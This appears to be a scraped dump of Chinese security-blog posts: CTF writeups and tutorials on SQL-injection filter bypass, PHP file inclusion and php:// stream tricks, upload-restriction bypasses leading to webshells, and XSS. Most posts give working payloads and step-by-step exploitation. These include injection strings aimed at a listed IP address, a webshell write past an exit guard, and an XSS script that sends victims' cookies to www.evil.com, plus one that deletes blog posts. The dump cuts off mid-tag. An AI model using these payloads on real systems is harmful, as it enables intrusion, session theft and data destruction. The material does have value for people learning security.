1name: baloteli 提交1’ 报错 near ‘’1’’’说明单引号影响了语句 且sql语句中id值两旁有 ‘ ‘ -&gt;要闭合单引号网页中SELECT语句大致语法为 SELECT * FROM users WHERE id = ‘$id’ 然后提交 1’or ‘’=’得到ID: 1’ or ‘’=’name: baloteliID: 1’ or ‘’=’name: kanawaluoID: 1’ or ‘’=’name: dengdeng即分别提交 1 2 3 所显示的消息并且可以得知 or没有被过滤 试下and关键字两种写法 (为了闭合单引号) (两种写法只做一个简单的比较)1&#39; and &#39;1&#39;=&#39;1 没反应1&#39; and 1=1 or&#39;&#39;=&#39; 报错第一种更简洁 但是第二种回显效果更好说明and被过滤 1&#39; /*and*/ &#39;1&#39;=&#39;11&#39; /*and*/ 1=1 or&#39;&#39;=&#39;均同上 说明还是不行 and被过滤 1&#39; /*!and*/ &#39;1&#39;=&#39;1只回显了id为1的值1&#39; /*!and*/ 1=1 or&#39;&#39;=&#39; 回显了id为1 2 3的值成功绕过 猜表名?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ admin) /*!and*/ &#39;&#39;=&#39;报错Table ‘web10.admin’ doesn’t exist换flag猜下?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;可以，那么就猜列名?id=&#39; or /*!exists*/ (/*!select*/ id /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;?id=&#39; or /*!exists*/ (/*!select*/ name /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;都可以 联合查询 加上/*!where*/ &#39;&#39;=&#39;是为了闭合单引号?id=&#39; /*!union*/ /*!select*/ 1,2 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;报错The used SELECT statements have a different number of columns?id=&#39; /*!union*/ /*!select*/ 1 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;可以 所以当前表只查找一列 ?id=&#39; /*!union*/ /*!select*/ name /*!from*/ flag /*!where*/ &#39;&#39;=&#39;报错Unknown column ‘name’ in ‘field list’这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列 实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过 最终的查询语句为&#39;unionunion selectselect flag fromfrom flag wherewhere &#39;&#39;=&#39;或者&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39; 后记 这个题还有比较奇怪的一点是不能用注释 注释掉后面的 ‘&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--+&#39; /*!union*/ /*!select*/ flag /*!from*/ flag#都不行 可能也进行了过滤 Sql 2 空格过滤这题过滤了空格.. 可以用/**/代替空格 ?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1 Sql 3 xss过滤题目 由题目源码可知 存在sql关键词过滤，存在xss过滤 可以知道strip_tags（）函数会过剥去字符串中的 HTML 标签 所以在sql关键词中插入HTML标签绕过sql过滤，然后通过xss过滤删去HTML标签 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 1%23 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 2%23 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 3%23 发现表只有两列 这步也可以这样http://103.238.227.13:10087/?id=1 un&lt;&gt;ion se&lt;&gt;lect 1,2%23 http://103.238.227.13:10087/?id=1 un&lt;&gt;ion se&lt;&gt;lect database(),2%23拿到数据库名 sql3 http://103.238.227.13:10087/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m sql3.key%23 或者 keyhttp://103.238.227.13:10087/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m key%23 `` 解释 假设第一个from是字段名，最后的table也是字段名，但是同时也是mysql关键字，这样执行的时候就会报错，所以应该使用 select from from table 还有把&lt;&gt;改成%00也能绕过","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"}]},{"title":"javascript伪协议与作用域","slug":"javascript伪协议与作用域","date":"2017-07-30T06:56:32.000Z","updated":"2017-07-30T12:48:16.868Z","comments":true,"path":"2017/07/30/javascript伪协议与作用域/","link":"","permalink":"http://Merl1ng.com/2017/07/30/javascript伪协议与作用域/","excerpt":"javascript 伪协议将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行","text":"javascript 伪协议将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开 javascript:alert(&quot;hello world!&quot;) javascript:window.history.forward(1)实现禁止浏览器后退 (hbctf里刚遇到的) 一般说来，伪协议经常被用到&lt;a&gt;的href属性上，例如&lt;a javascript:alert(&#39;hello&#39;);&quot;&gt;。这样，点击此链接的默认行为就是弹出一个框，而不是跳转至某页面了。此处需要注意的地方有两点： 1，返回值对浏览器行为的影响。返回undefined，停留在原页面，其它跳转至返回值。这就是为什么出现“false”页面的原因了。旧代码中能看到javascript:void(…);的写法，其实也是为了生成一个undefined的返回值，等同于在最后直接加return; 2，this指向global变量。这不是说例子中alert里的this是global变量，而是连href属性里的this是global变量。因为此处是默认行为，不是事件，所以里面的代码的执行上下文不是触发元素。 伪协议还可以使用在form元素的action里，行为和使用在anchor上一样 “javascript:void(0)”为什么需要javascript:void(0)? 答案:a标签如果不加href属性，就不会有链接样式，所以必须要加href属性，如果href=”#”，那么点击会跳转到首页 所以需要一个点了没反应的开发方法 ，那就是用href=”javascript:void(0)”—javascript:void(0)仅仅表示一个死链接，点击了什么也不会发生—但注意，javascript:void(expression) 不是一个死链接，如果有表达式，或者元素绑定了事件，点击后会执行表达式，或者执行绑定事件—href=“#”中#包含了一个位置信息默认的锚是#top 也就是网页的上端，这就是为什么有的时候页面很长浏览链接明明是#，但是却跳动到了页首 void是javascipt自身的操作符，它表示的是只执行表达式，但没有返回值表示不作任何操作，这样会防止链接跳转到其他页面 可以使用void操作符指定超级链接，如javascript：void(document.form.submit())。表达式会被计算但是不会在当前文档处装入任何内容，void(0)计算为0，但在JavaScript上没有任何效果，也就是说&lt;a href=&quot;javascript：void(0)&quot;&gt;的效果同&lt;a href=&quot;javascript：void(1)&quot;&gt;的效果是一样的 这么做往往是为了保留链接的样式，但不让链接执行实际操作，具体的操作交给链接的onclick事件处理 比如1.&lt;a href=&quot;javascript：void(0)&quot; onclick=&quot;doSomething()&quot;&gt;test&lt;/a&gt; 2.&lt;a href=&quot;#&quot; onclick=&quot;doSomething();return false;&quot;&gt;什么问题都解决了,包括浏览器不兼容问题&lt;/a&gt; //或者直接使用href=”” 3.&lt;a href=&quot;#&quot; onclick=&quot;alert();event.returnValue=false;&quot;&gt;test&lt;/a&gt; 其它与”javascript:void(0)”同作用的写法&lt;a href=&quot;#&quot;&gt;&lt;/a&gt; 点击这个链接后，会让页面跳到页面顶部，在location.href后面增加#号 &lt;a href=&quot;#none&quot;&gt;&lt;/a&gt;点击这个链接后， 如果页面里面有id为none的元素，会执行锚点机制跳转到这个元素上缘 &lt;a href=&quot;###&quot;&gt;&lt;/a&gt; 不跳转，可以阻止默认的跳转行为，但是这个在后端代码中容易识别成注释，后面的代码不显示——-下面用了伪协议——– &lt;a href=&quot;javascript:&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript :void(0);&quot;&gt;&lt;/a&gt; 其中没写分号的 在IE6下面点击a标签 会造成页面中的gif暂停 javascript 作用域if、try、for等语句并不会产生新的作用域 python 也是 想产生作用域 -&gt; 闭包","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://Merl1ng.com/tags/javascript/"}]},{"title":"hbctf第九场writeup","slug":"hbctf第九场writeup","date":"2017-07-29T13:25:26.000Z","updated":"2017-08-25T12:32:40.372Z","comments":true,"path":"2017/07/29/hbctf第九场writeup/","link":"","permalink":"http://Merl1ng.com/2017/07/29/hbctf第九场writeup/","excerpt":"第一次比赛拿到排名 有点小激动 整理一下完成这篇write up顺便膜一波出题大佬","text":"第一次比赛拿到排名 有点小激动 整理一下完成这篇write up顺便膜一波出题大佬 签到题原页面pact.cc/xxoo/ 即pact.cc/xxoo/index.php 点击按钮 页面跳转到 pact.cc/xxoo/1ndex.php（刚开始我还以为浏览器不区分1和i…） F12看看代码里没什么奇怪的东西 控制台里也没有(就有一行这个比较在意 查了一下功能是禁止浏览器后退 javascript:window.history.forward(1);)响应里也没有奇奇怪怪的地方 这题也无法提交数据把post改成get试了试也没什么用 猜测只能Burp抓包分析 又因为是签到题直接 forward 就看到flag放到Repeater里 go 也可以（不关拦截） 这题其实点击按钮就有flag但是浏览器自动跳转到下一个页面看不到 所以要抓包 misc下载文件 文件名为 PwdIs4 解压密码为4（一开始没看出密码提示winhex打开试了下伪加密 ..后来才知道zip才有伪加密）解压出来只有个0.jpg全黑 文件名为白ste试试没啥用 主要关注点都在 这个0.jpg上 但是这个压缩包直接打开会发现还有一个 Thumbs.db文件这个以前常见的Thumbs.db 常保存图片文件的缩略图 直接解压是看不到的。。下载 图片历史纪录查看器 或者 Thumbs Viewer 查看得到flag binwalk也可以 binwalk “-D=jpeg” Thumbs.db (ls命令是可以看到db文件的)(jpeg要小写)（jpeg是文件格式 需要具体更改 如果是bmp图则改为bitmap）得到 web/misc+crypto再膜一波出题大佬 进入网站一个登陆框 出题人提示不是sql或者xss 弱口令猜测 admin green（就是试 有提示green） 这时左边出现photo is the boss !!!右边代码里多出注释&#39;***&#39;=&#39;3&#39; 并且右边源代码里有 图片地址 goodhat.jpg 可知在同一目录下访问pcat.cc/green/goodhat.jpg 下载图片 直接winhex打开这时知道了提示的作用替换掉 然后decode(‘hex’) 就是其中 “\\n”为换行符用yafu来分解n factor() 然后编写代码 (yafu介绍写在后面)1234567891011121314# -*- coding:utf8 -*-import libnumimport gmpy2n=73069886771625642807435783661014062604264768481735145873508846925735521695159e=65537p = 386123125371923651191219869811293586459q = 189239861511125143212536989589123569301assert n==p*qc=15116717704501623028903918131505510580599561357387431295289012193980554012811d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)print libnum.n2s(m) 需要先安装两个库 gmpy2库安装2.7对应版本时 64位 直接安exe whl文件安装会报错 得到结果为 nc 119.28.15.34 8888 浏览器访问下试了试 去Kail 是一个 pwn 根据提示猜出payload 拿到flag yafuRSA 利用公约数分解 针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。 在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。 此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。 在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下 密码学的东西不太懂 直接贴网址 http://www.tuicool.com/articles/iYBZBfy 一点其他的pwn记录这个是因为比赛后看到了学长和一个大佬的交流中出现了 print asm(shellcraft.i386.linux.sh())这个东东 查了一下 shellcraft可以生成对应架构的shellcode代码 asm用于汇编和 反汇编源于一个ctf常用库 pwntools http://m.blog.csdn.net/gyhgx/article/details/53439417 顺便了解下 bpython","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"文件包含和php伪协议","slug":"文件包含和php伪协议","date":"2017-07-27T10:16:25.000Z","updated":"2017-10-03T09:23:08.345Z","comments":true,"path":"2017/07/27/文件包含和php伪协议/","link":"","permalink":"http://Merl1ng.com/2017/07/27/文件包含和php伪协议/","excerpt":"文件包含本地包含在test.txt内写入&lt;?php phpinfo();?&gt;仅仅调用 phpinfo 来测试 会使页面显示php信息方便观察然后在相同目录下放置一个fileinclude.php","text":"文件包含本地包含在test.txt内写入&lt;?php phpinfo();?&gt;仅仅调用 phpinfo 来测试 会使页面显示php信息方便观察然后在相同目录下放置一个fileinclude.php12345&lt;?php$file=@$_GET['file'];if($file)&#123; echo \"&lt;center&gt;File:\".$file.\"&lt;br/&gt;Result:&lt;/center&gt;\"; include $file; 第一行代码获取URL 参数file 的内容。2 ~4行首先判断$file 是否为空，若不为空，输出其内容，并将其作为文件名称包含将其部署在 localhost下然后访问 http://localhost/fileinclude.php?file=test.txt 会看到phpinfo的输出即test.txt里面的php代码被执行 test文件的扩展名为txt而不是.php也能说明该漏洞无视扩展名 （jpg也同样有效）但是如果被包含的文件里面没有php标签 那么就会当成html内容如实显示出来 远程包含需要 php配置文件中 allow_url_include 设置为 on http://localhost/fileinclude.php?file=http://locahost/text.txt 截断技巧有些程序会给被包含内容加一些后缀 比如如果fileinclude.php是这样123456&lt;?php $file=@$_GET['file']; if($file)&#123; $file .= '.php'; echo \"&lt;center&gt;File:\".$file.\"&lt;br/&gt;Result:&lt;/center&gt;\"; include $file; &#125; 它的后面加了个.php 所以如果传入 file=test.txt 就会变成text.txt.php 从而包含失败如果php版本小于5.3并且 magic_quotes_gpc 已取消 可以使用 %00截断传入file=text.txt%00 PHP伪协议php中支持的伪协议 file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 对于php://filter名称描述resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 实现文件包含在允许远程包含的情况下(allow_url_include 设置为 on) 可以使用php://伪协议比如php://filter/resource=test.txt可以读取相同文件http://localhost/fileinclude.php?file=php://filter/resource=test.txt 进一步的任意文件读取 当要获取的文件里有不可打印的字符 或想获取的代码php://filter/read=convert.base64-encode/resource=test.txthttp://localhost/fileinclude.php?file=php://filter/read=convert.base64-encode/resource=test.txt 其中php://input代表可以访问请求的原始数据，简单来说POST请求的情况下 php://input可以获取到post的数据。比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的 其可以读取原始的HTTP正文内容 如果将file设置为php://input，并且在HTTP正文中传入PHP代码（可用hackbar Post data写入正文）比如&lt;?phpphpinfo();?&gt;即可以执行代码 对exit的绕过某题目有如下代码1234&lt;?php$content = '&lt;?php exit; ?&gt;';$content .= $_POST['txt'];file_put_contents($_POST['filename'], $content); $content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制） 这里的$_POST[&#39;filename&#39;]是可以控制协议的 即可使用 php://filter协议使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除exit 因为base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码 所以，一个正常的base64_decode实际上可以理解为如下两个步骤： 123&lt;?php$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);base64_decode($_GET['txt']); 所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode来首先对其解码在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。 “phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码 结果就是&lt;?php exit; ?&gt;没有了 利用Burp 的Repeatertxt=a一句话的base64编码filename=php://filter/write=convert.base64-decode/resource=shell.php 补一张大佬的效果图","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"},{"name":"include","slug":"include","permalink":"http://Merl1ng.com/tags/include/"}]},{"title":"突破文件上传中对文件的限制","slug":"突破文件上传中对文件的限制","date":"2017-07-27T07:16:11.000Z","updated":"2017-10-03T09:11:27.146Z","comments":true,"path":"2017/07/27/突破文件上传中对文件的限制/","link":"","permalink":"http://Merl1ng.com/2017/07/27/突破文件上传中对文件的限制/","excerpt":"之前记录过在文件上传中突破对一句话代码过滤的限制这次从文件的角度突破限制","text":"之前记录过在文件上传中突破对一句话代码过滤的限制这次从文件的角度突破限制 文件类型限制搭建环境a.php 123456789101112131415161718192021&lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt; 点这里上传文件: &lt;input type=\"file\" name=\"userfile\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;?php if(!isset($_FILES['userfile'])) exit; echo \"&lt;pre&gt;\"; print_r($_FILES); echo \"&lt;/pre&gt;\";if(@$_FILES['userfile']['type'] != \"image/gif\")&#123; echo \"对不起，我们只允许上传GIF格式的图片!!\"; exit; &#125; $uploaddir='upfile/'; $PreviousFile=$uploaddir.basename(@$_FILES['userfile']['name']);if(move_uploaded_file(@$_FILES['userfile']['tmp_name'], $Previou sFile)) echo \"上传成功！\"; else echo \"上传失败！\"; 它首先验证了文件类型，如果是 gif则放过 不是 则拦截根据multipart编码类型，type这个东西在浏览器生成之后，是可以改的 我们可以通过Burp拦截并修改这个值首先打开 Burp，配置代理，访问a.php之后开启拦截模式并上传一个文件拦截之后，在proxy中找到Content-Type，发现他是application/oct-stream(这里指的是你上传的文件) ，把它改成image/gif 之后放行 文件扩展名限制1234567891011121314151617181920212223242526272829&lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt; 点这里上传文件: &lt;input type=\"file\" name=\"userfile\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;?php function extname($s) &#123; $p = strrpos($s, '.'); if($p === false) retturn''; else return substr($s,$p + 1);&#125;if(!isset($_FILES['userfile'])) exit; echo \"&lt;pre&gt;\"; print_r($_FILES); echo \"&lt;/pre&gt;\";if(extname(@$_FILES['userfile']['name'])!= 'gif')&#123; echo \"对不起，我们只允许上传GIF格式的图片!!\"; exit; &#125; $uploaddir='upfile/'; $PreviousFile=$uploaddir.basename(@$_FILES['userfile']['name']);if(move_uploaded_file(@$_FILES['userfile']['tmp_name'], $Previou sFile)) echo \"上传成功！\"; else echo \"上传失败！\"; 之前的文件类型校验变成了后缀名校验 那么如何绕过呢？其实，很多服务器都可以使用 00截断来绕过。原理是这样，操作系统不允许文件中存在空字符’\\0’，所以保存文件时会发生截断，只保留空字符前面的东西作为文件名但是后端程序中是可以处理空字符的。例如，我们如果把文件名改成1.php\\0.jpg ，那么在程序中，它的扩展名为jpg，但是保存之后,文件名为1.php，从而达到绕过的目的 同样使用Burp操作 点击Intercept is on 关闭拦截模式点击Send to Repeater 在 Repeater 中找到在1.php(上传的文件名)后添加.gif然后点击hex.gif的十六进制是2e 67 69 66在2e右键 insert byte2e之前就会出现00 点击go发送请求 Nginx解析漏洞www.qaq.com存在漏洞假设该站点上有一张图片 url地址为www.qaq,com/logo.jpg当正常访问时 Nginx会把它当做非脚本 直接读取并传给客户端但是如果这样访问 www.qaq.com/logo.jpg/a.php或者 www.qaq.com/logo.jpg%00.php它就会把logo.php当做PHP文件执行 所以为了利用该漏洞可以找一张图片 在里面插入一句话（图片用Notepad++打开写入代码）上传该图片然后 以www.qaq.com/123.jpg/a.php为url 连接菜刀 Apache解析漏洞Apache的1.x和2.x版本中 会从右到左解析扩展名 碰到不认识的扩展名继续解析比如上传 123.php.owf.rar 它将按照 rar owf php 的顺序解析扩展名但是其不认识 rar 和 owf 所以将其解析为 php 但是在程序中123文件的扩展名仍是rar","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"}]},{"title":"xss长度限制绕过","slug":"xss长度限制绕过","date":"2017-07-26T09:40:34.000Z","updated":"2017-07-27T06:05:19.598Z","comments":true,"path":"2017/07/26/xss长度限制绕过/","link":"","permalink":"http://Merl1ng.com/2017/07/26/xss长度限制绕过/","excerpt":"实验吧遇到的一道题 input输入框内存在xss 但是限制了输入长度 则可以通过注释符打通两个注释框之间的部分","text":"实验吧遇到的一道题 input输入框内存在xss 但是限制了输入长度 则可以通过注释符打通两个注释框之间的部分比如某网站留言板分别有留言标题 和 留言内容两个输入框 在第一个输入框内输入&lt;script&gt;&lt;!-- 第二个输入框内输入--&gt;alert(/xss/)&lt;script/&gt;成功弹窗 还有一种情况在留言处虽然有多处输入框 但是只有一处存在xss但是此处存在长度限制 比如在第一个输入框内 则可以通过两次连续留言用注释打通 第一次留言时在第一个输入框内写下*/&lt;/script&gt;（先留的言在后面）其他的输入框内容随便写先提交留言 然后进行第二次留言在第一个输入框内写下&lt;script&gt;alert(&#39;xss&#39;)/*其他的输入框内容随便写（当时的题即使用不同的用户进行留言仍然可以弹窗）","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"}]},{"title":"xss所加载的脚本","slug":"xss所加载的脚本","date":"2017-07-24T09:44:20.000Z","updated":"2017-07-28T05:58:48.742Z","comments":true,"path":"2017/07/24/xss所加载的脚本/","link":"","permalink":"http://Merl1ng.com/2017/07/24/xss所加载的脚本/","excerpt":"XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js","text":"XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本jshttp://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码 在evil.js中 可写入123var img = document.createElement(\"img\");img.src = \"http://www.evil.com/log?\"+escape(document.cookie);document.body.appendChild(img); 这段代码在页面中插入了一张看不见的图片 同时把document.cookie对象作为参数发送到远程服务器 http://www.evil.com/log 可以不存在 因为这个请求会在远程服务器的Web日志中留下记录127.0.0.1 - - [24/Jul/2017:20:19:18 +8080] “GET /log?cookie1%D1234 HTTP1.1” 404 288 利用XSS删除文章首先正常删除该文章的连接是http://blog.sohu.com/manage/entry.do?m=delete&amp;id=12345678 则只要知道文章的id 就可以通过这个请求删除改文章 可以通过插入一张图片来发起一个GET请求XSS Payload为123var img = document.createElement(\"img\");img.src = \"http://blog.sohu.com/manage/entry.do?m=delete&amp;id*12345678\";document.body.appendChild(img); 加载目标网站上不是该站的脚本在目标网站上找到不是本站的js 然后渗透那个网站 重写js 来达到渗透目标网站 1234567for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++)&#123; var a = document.createElement('a'); a.href = tag.src||tag.href||tag.data; if(a.hostname!=location.hostname)&#123; console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href); &#125;&#125; （这段代码实际可以找出J/C）将该段代码输入在控制台内 回车比如在www.CUC.com内输入显示发现第三方资源http://www.qaq.pw/1.js 渗透http://www.qaq.pw/1.js在1.js下重写js 即XSS Payload 当然 如果这个js是你自己写的就更加方便 外源JS现在的Web应用或多或少会使用一些外源的 JS，但这里面可能存在安全隐患。如果你自己编写了一个JS文件，提供了一些功能，并且把它放到了CDN上给别人用 你就可以修改它的内容所有使用它的站点都会受到影响 比如，你可以插入一个location.href的赋值来劫持站点，或者插入XSS平台的Payload来获取用户Cookie再或者插入一个对资源的访问来DDoS该站点。这种情况下，你可以让这些站点来帮你执行任何代码","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"}]},{"title":"xss基础笔记","slug":"xss基础笔记","date":"2017-07-23T14:27:34.000Z","updated":"2017-08-08T07:25:56.134Z","comments":true,"path":"2017/07/23/xss基础笔记/","link":"","permalink":"http://Merl1ng.com/2017/07/23/xss基础笔记/","excerpt":"xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)","text":"xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt;&lt;input type=\"text\" name=\"xss_input\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php$xss = $_GET['xss_input'];echo '你输入的字符为&lt;br&gt;'.$xss;?&gt;&lt;/body&gt;&lt;/html&gt; 输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;成功弹窗输出点在&lt;br&gt;和&lt;/boby&gt;里 利用xss输出的环境来构造代码(除了上述的在&lt;br&gt;和&lt;/boby&gt;里，还有很多其他情况) 12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;&lt;form action=\"\" method=\"get\"&gt;&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;&lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php$xss = $_GET['xss_input_value'];if(isset($xss))&#123;echo '&lt;input type=\"text\" value=\"'.$xss.'\"&gt;';&#125;else&#123;echo '&lt;input type=\"type\" value=\"输出\"&gt;';&#125;?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 这时输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;无弹窗因为输入点在value属性里面，会被当成value里的值来显现出来，所以并没有弹窗因此改为&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;闭合input标签 成功弹窗 但是会多出一个”&gt; 并会直接把多余的字符串输出原因在于使用了标签 so…需要在input标签里不带标签的且可以调用js的属性-&gt;on事件&quot; onclick=&quot;alert(&#39;xss&#39;)onclick-&gt;当鼠标点击的第二个input输入框时触发也可以成功弹窗 进一步 可以把onclick改成Onmousemove 当鼠标移动就触发Onload 当页面加载完成后触发 在&lt;textarea&gt;标签里 或者其他优先级比script高的标签通过闭合完整的标签&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 几种过滤的解决办法（暂时放这）&lt;img scr=1 onerror=alert(&#39;xss&#39;)&gt;当找不到图片名为1的文件时，执行alert(‘xss’)&lt;a href=javascrip:alert(&#39;xss&#39;)&gt;s&lt;/a&gt; 点击s时运行alert(‘xss’)&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe的scr来弹窗&lt;img src=&quot;1&quot; onerror=eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&quot;)&gt;&lt;/img&gt;过滤了alert来执行弹窗 xss分类反射型XSS、储蓄型XSS、DOM XSS 反射型XSSHacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短——发送给受害人——受害打开后执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等) 比如http://qaq.cn/id=123存在xss漏洞可用JSky、Safe3WVS、Netsparker等软件挖掘出部分反射XSS查看网站源码（view-source:网址 或者 ctrl+u）在id=123后面写abc ctrl+f搜索abc看其出现在哪个位置根据环境构造代码 写在之后 比如http://qaq.cn/id=123&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;把url变成短连接，发送给管理员，诱使管理员打开 储蓄型XSS储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上打开留言处(book.asp)先在留言里出输入s提交留言，F12打开审查元素，来看输入的标签是否被过滤了如果s是彩色的说明没有过滤，如果是灰色就说明过滤了若没过滤 再次留言 可写&quot;&lt;script src=&quot;url&quot;&gt;&lt;/script&gt;请问怎么报名啊&quot;url为你自己的网站无论是谁点击了你所留言的网址（不是你自己那个网址）即可收割cookie Exp 1&lt;script 